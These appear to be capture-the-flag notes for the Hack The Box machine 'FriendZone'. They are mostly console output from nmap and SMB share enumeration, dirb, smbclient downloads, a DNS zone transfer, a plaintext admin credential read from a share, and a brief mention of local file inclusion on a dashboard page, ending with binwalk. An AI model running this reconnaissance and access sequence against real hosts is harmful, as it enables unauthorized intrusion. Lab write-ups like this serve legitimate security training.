```console
root@kali:~/HTB/Machines/123# nmap 10.10.10.123
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-15 12:25 EDT
Nmap scan report for 10.10.10.123
Host is up (0.25s latency).
Not shown: 993 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 26.77 seconds
```
```console
root@kali:~/HTB/Machines/123# nmap --script smb-enum-shares.nse -p445 10.10.10.123
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-15 13:05 EDT
Nmap scan report for FriendZone (10.10.10.123)
Host is up (0.25s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.123\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\Files: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 63.25 seconds
root@kali:~/HTB/Machines/123# 
```

```console
root@kali:~/HTB/Machines/123# dirb https://friendzone.red/ /usr/share/dirb/wordlists/small.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Mar 15 13:19:36 2019
URL_BASE: https://friendzone.red/
WORDLIST_FILES: /usr/share/dirb/wordlists/small.txt

-----------------

GENERATED WORDS: 959                                                           

---- Scanning URL: https://friendzone.red/ ----
==> DIRECTORY: https://friendzone.red/admin/                                                                                                                 
==> DIRECTORY: https://friendzone.red/js/                                                                                                                    
                                                                                                                                                             
---- Entering directory: https://friendzone.red/admin/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                             
---- Entering directory: https://friendzone.red/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Mar 15 13:23:57 2019
DOWNLOADED: 959 - FOUND: 0
root@kali:~/HTB/Machines/123# 
```

```console
root@kali:/mnt/hgfs/HTB/Machines/123# smbclient //10.10.10.123/Development -U guest
Enter WORKGROUP\guest's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 15 13:05:55 2019
  ..                                  D        0  Wed Jan 23 16:51:02 2019
  rev.php                             A     5495  Fri Mar 15 12:53:38 2019
  test.php                            A       19  Fri Mar 15 12:50:18 2019
  test.txt                            A       15  Fri Mar 15 12:30:04 2019

		9221460 blocks of size 1024. 6440388 blocks available
smb: \> pwd
Current directory is \\10.10.10.123\Development\
smb: \> cd ..
smb: \> dir
  .                                   D        0  Fri Mar 15 13:05:55 2019
  ..                                  D        0  Wed Jan 23 16:51:02 2019
  rev.php                             A     5495  Fri Mar 15 12:53:38 2019
  test.php                            A       19  Fri Mar 15 12:50:18 2019
  test.txt                            A       15  Fri Mar 15 12:30:04 2019

		9221460 blocks of size 1024. 6440292 blocks available
smb: \> cat test.txt
cat: command not found
smb: \> get test.txt
getting file \test.txt of size 15 as test.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> get test.php
getting file \test.php of size 19 as test.php (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> get rev.php
getting file \rev.php of size 5495 as rev.php (5.4 KiloBytes/sec) (average 1.8 KiloBytes/sec)
smb: \> exit
root@kali:/mnt/hgfs/HTB/Machines/123# smbclient //10.10.10.123/general
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Wed Jan 23 16:51:02 2019
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

		9221460 blocks of size 1024. 6438776 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
root@kali:/mnt/hgfs/HTB/Machines/123#
```
```console
root@kali:/mnt/hgfs/HTB/Machines/123# dig @10.10.10.123 friendzone.red axfr

; <<>> DiG 9.11.5-P1-1-Debian <<>> @10.10.10.123 friendzone.red axfr
; (1 server found)
;; global options: +cmd
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 269 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Sat Mar 16 05:45:05 EDT 2019
;; XFR size: 8 records (messages 1, bytes 289)

root@kali:/mnt/hgfs/HTB/Machines/123# 
```

```console
root@kali:~/HTB/Machines/123# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.10.123 friendzone.red
10.10.10.123 uploads.friendzone.red
10.10.10.123 administrator1.friendzone.red
10.10.10.123 hr.friendzone.red
root@kali:~/HTB/Machines/123# 
```

Visit
https://administrator1.friendzone.red/
```console
root@kali:/mnt/hgfs/HTB/Machines/123# smbclient //10.10.10.123/general
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Wed Jan 23 16:51:02 2019
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

		9221460 blocks of size 1024. 6251388 blocks available
smb: \> more creds.txt
getting file \creds.txt of size 57 as /tmp/smbmore.PzDdr5 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

creds for the admin THING:

admin:WORKWORKHhallelujah@#

/tmp/smbmore.t08AB7 (END)
```
Try Login

Visit
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=1552735731

Using LFI
https://administrator1.friendzone.red/images/b.jpg

```condole
root@kali:/mnt/hgfs/HTB/Machines/123# binwalk b.jpg.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 852 x 480, 8-bit/color RGB, non-interlaced
876           0x36C           Zlib compressed data, best compression

root@kali:/mnt/hgfs/HTB/Machines/123#
```
